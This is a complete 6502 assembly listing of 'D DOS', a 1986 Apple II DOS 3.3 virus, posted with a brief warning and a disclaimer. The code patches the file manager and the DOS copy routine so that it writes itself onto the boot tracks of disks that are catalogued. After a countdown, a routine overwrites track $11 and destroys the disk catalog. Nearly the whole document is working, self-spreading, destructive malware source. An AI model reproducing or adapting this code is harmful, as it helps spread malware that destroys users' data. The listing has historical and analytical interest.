-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
Warning, warning. Below is real virus code. If you type it in,
assemble it, and install it on a working Apple ][ DOS 3.3 boot disk,
then you will have infected that disk. I won't take responsibility
if you do that. [ Usual disclaimers. Please, don't be stupid enough
to actually make this working code. Just read it and see how it works.]
-----------------
Warren-----------------------------------------------------------------------------------------
-----------------


1 ; *************************
2 ; * *
3 ; * D DOS *
4 ; * *
5 ; * A DOS VIRAL INFECTION *
6 ; * *
7 ; * (C) 1986 *
8 ; * *
9 ; * THE STUDENT *
10 ; * & *
11 ; * THE HAWK *
12 ; * *
13 ; *************************
14 ;
15 ;
16 ; DOS & MONITOR EQUATES
17 ; ---------------------
18 ;
19 BUFFER EQU $9A00 ;Buffer used by D DOS
20 DCOUNT EQU BUFFER+$6 ;Disk count lsb in buffer
21 ;DCOUNT+1 is msb
22 SSAV1 EQU $B39B ;Address used by DOS
23 FMDRVN EQU $B5C0 ;Drive used by FM
24 FMSLTN EQU $B5C1 ;Slot used by FM
25 RWTS EQU $B7B5 ;RWTS subroutine
26 BUFCOPY EQU BUFFER+$5D ;Tk0,Sc1 modification address
27 RSTFMW EQU $AE6A ;Restores FM workarea
28 SUBCODE EQU $B5BC ;Current FM sub-op
29 ;
30 ;
31 ; Remember $9D00:D9 99 for the
32 ; file buffer modification
33 ;
34 ORG $AB06
35 OBJ $800
36 ;
37 ;
38 ; Replacement code to patch
39 ; into the file manager
40 ; -------------------------
41 ;
42 FILMGR TSX
43 STX SSAV1
44 JSR DDOS ;Jump to DDOS immediately
45 ;
46 ;
47 ;
48 ORG $B75D
49 OBJ $800
50 ;
51 ;
52 ; Replacement code to patch
53 ; into the DOS copying routine
54 ; ----------------------------
55 ;
56 DOSCOPY LDA #$1B ;Set the count to
57 STA $B7E1 ;$1B so as to copy
58 LDA #$02 ;sectors 0A & 0B of
59 STA $B7EC ;Track 0
60 LDA #$04
61 STA $B7ED ;*D DOS is stored on
62 LDA #$02 ;Tk 0, Sc 0A
63 STA $B7F4
64 JSR $B793
65 LDA $B7E7
66 STA $B6FE
67 CLC
68 ADC #$09
69 STA $B7F1
70 LDA #$0A
71 STA $B7E1
72 SEC
73 SBC #$01
74 STA $B6FF
75 STA $B7ED
76 JSR $B793
77 RTS
78 ;
79 ;
80 ;
81 ORG $9B00
82 OBJ $800
83 ;
84 ;
85 ; Subroutine to read/write a
86 ; sector. X holds Tk, Y holds
87 ; Sc, A holds R/W command
88 ; ---------------------------
89 ;
90 GETSC STX IBTRK ;Store track in IOB
91 STY IBSC ;Store sctr in IOB
92 STA IBCMD ;Store cmmnd in IOB
93 LDA /IOB ; ** Drive & buffer
94 LDY #IOB ; ** set externally
95 JSR RWTS ;Do the RWTS
96 RTS
97 MCOUNT HEX 0004 ;Memory count (lsb & msb)
98 BOOTCNT HEX 03 ;Stops DDOS interrupting bootup
99 COUNT HEX 10 ;Used as a temp count
100 ;
101 ;
102 ;
103 ;
104 ; D DOS Entry point
105 ; -----------------
106 ;
107 ;
108 DDOS PHP ;Push all registers
109 PHA
110 TXA
111 PHA
112 TYA
113 PHA
114 LDA BOOTCNT ;Test BOOTCNT
115 BEQ DDOS2 ;If not +ve,goto DDOS
116 BMI DDOS2
117 DEC BOOTCNT ;else dec BOOTCNT
118 JMP RESTOR ;and bypass DDOS
119 ;
120 DDOS2 JSR RSTFMW ;Restore FM workarea
121 LDA SUBCODE ;Is FM acessing catalog?
122 BEQ >1 ;Yes, do DDOS
123 JMP RESTOR ;else go to DOS
124 ^1 LDA FMDRVN ;Get drive user wants
125 BEQ GETCAT ;If 0, use last value
126 STA IBDRVN ;We want it too!
127 LDA FMSLTN ;Get the slot also
128 ASL ;Multiply by 16 to
129 ASL ;conform to the RWTS
130 ASL
131 ASL
132 STA IBSLT
133 ;
134 GETCAT LDA #BUFFER ;Set up I/O buffer
135 STA IBBUFR
136 LDA /BUFFER
137 STA IBBUFR+1
138 LDX #$11 ;Set Tk11,Sc0F,read
139 LDY #$0F
140 LDA #$01
141 JSR GETSC ;Get the sector
142 BCS ERROR ;Error, inform DOS
143 LDA BOOTCNT ;Is it 0?
144 BNE CHECKID ;No, continue with DDOS
145 DEC BOOTCNT ;else dec BOOTCNT
146 LDA DCOUNT ;and copy DCOUNT
147 STA MCOUNT ;into memory
148 LDA DCOUNT+1
149 STA MCOUNT+1
150 CHECKID LDA #$48 ;Is it DDOS?
151 CMP BUFFER+3
152 BNE COPYDOS ;No, COPYDOS
153 LDA #$26
154 CMP BUFFER+4
155 BNE COPYDOS ;No, COPYDOS
156 LDA #$53
157 CMP BUFFER+5
158 BNE COPYDOS ;No, COPYDOS
159 ;
160 CHEKMCNT LDA MCOUNT ;Is MCOUNT=0?
161 ORA MCOUNT+1
162 BEQ BOMB2 ;Yes, BOMB
163 ;
164 DECMCNT DEC MCOUNT ;Dec MCOUNT lsb
165 LDA MCOUNT ;Is it #$FF?
166 CMP #$FF
167 BNE COMPCNT ;No, don't lower msb
168 DEC MCOUNT+1
169 ;
170 COMPCNT LDA DCOUNT+1 ;Check DCOUNT>=MCOUNT
171 CMP MCOUNT+1
172 BMI RESTOR ;No, restore
173 BEQ COMPCNT2 ;Equal? Test again
174 BPL COPYCNT ;Else COPYCOUNT
175 COMPCNT2 LDA DCOUNT ;Compare lsb's
176 CMP MCOUNT
177 BMI RESTOR ;No, restore
178 ;
179 COPYCNT LDA MCOUNT ;Copy MCOUNT to buffer
180 STA DCOUNT
181 LDA MCOUNT+1
182 STA DCOUNT+1
183 LDX #$11 ;and copy to disk
184 LDY #$0F
185 LDA #$02
186 JSR GETSC ;Done!
187 ;
188 RESTOR PLA ;Pull registers
189 TAY
190 PLA
191 TAX
192 PLA
193 PLP
194 JMP $AE6A ;and go back to DOS
195 ;
196 ;
197 BOMB2 JMP BOMB ;Jump to BOMB routine
198 ;
199 ;
200 ERROR PLA ;Pull all off stack
201 PLA
202 PLA
203 PLA
204 LDX #$08 ;Set I/O ERROR
205 STX $AA5C ;and store in DOS
206 JMP $A6D5 ;then jump to error handler
207 ;
208 ;
209 ;
210 ; Copydos: We must first modify Tk0,Sc1
211 ; as it contains the 'state' of DOS at
212 ; bootup. We must also copy Tk0,Sc0A-0C,
213 ; Tk1,Sc0A and Tk11,Sc0F
214 ;
215 COPYDOS LDA #$48 ;First set DDOS idbytes
216 STA BUFFER+3 ;in Tk11,ScF
217 LDA #$26
218 STA BUFFER+4
219 LDA #$53
220 STA BUFFER+5
221 LDA MCOUNT ;Copy MCOUNT to disk
222 STA DCOUNT
223 LDA MCOUNT+1
224 STA DCOUNT+1
225 LDX #$11
226 LDY #$0F
227 LDA #$02
228 JSR GETSC ;Done!
229 BCS RESTOR ;If error, return to DOS
230 LDX #$00
231 LDY #$01
232 TYA ;Read Tk0,Sc1 into buffer
233 JSR GETSC ;Done!
234 LDX #$37 ;Set X=54
235 LOOP1 LDA DOSCOPY,X ;Modify sector
236 STA BUFCOPY,X
237 DEX ;Decrement X register
238 BPL LOOP1
239 INX ;Now save Tk0,Sc0A
240 LDY #$01 ;Modified, now save back
241 LDA #$02 ;to disk
242 JSR GETSC
243 LDA /$9B00 ;Now save Tk0,ScA
244 STA IBBUFR+1
245 LDA #$04 ;Init BOOTCNT
246 STA BOOTCNT
247 LDX #$00
248 LDY #$0A
249 LDA #$02
250 JSR GETSC ;Done!
251 LDA #$FF ;Restore BOOTCNT
252 STA BOOTCNT ;to normal value
253 INC IBBUFR+1 ;Now Tk0,ScB
254 LDX #$00
255 LDY #$0B
256 LDA #$02
257 JSR GETSC ;Done!
258 INC IBBUFR+1 ;Now Tk0,ScC
259 LDX #$00
260 LDY #$0C
261 LDA #$02
262 JSR GETSC ;Done!
263 LDA /$AB00 ;Now Tk1,ScA
264 STA IBBUFR+1
265 LDX #$01
266 LDY #$0A
267 LDA #$02
268 JSR GETSC ;Done!
269 JMP RESTOR ;and go to DOS
270 ;
271 BOMB LDA #$AB ;Make a strange buffer
272 STA BUFFER+1
273 LDA #$10 ;Overwrite all of
274 STA COUNT ;track $11 !
275 LOOP2 DEC COUNT ;Decrement the counter
276 LDX #$11
277 LDY COUNT
278 LDA #$02
279 JSR GETSC ;Write the sector!
280 LDY COUNT ;If count >0, loop
281 BNE LOOP2
282 JMP RESTOR ;and return to DOS
283 ;
284 ;
285 ;
286 IOB HEX 01 ;IOB starts here
287 IBSLT HEX 60 ;IOB slot
288 IBDRVN HEX 01 ;IOB drive
289 IBVOL HEX 00 ;IOB volume
290 IBTRK HEX 00 ;IOB track
291 IBSC HEX 00 ;IOB sector
292 IBDCT ADR DCT ;DCT address
293 IBBUFR HEX 0000 ;IOB buffer
294 HEX 0000
295 IBCMD HEX 00 ;IOB command
296 IBSTAT HEX 00 ;IOB errors
297 HEX 006001
298 ;
299 DCT HEX 0001EFD8
300 ;
301 ;
302 END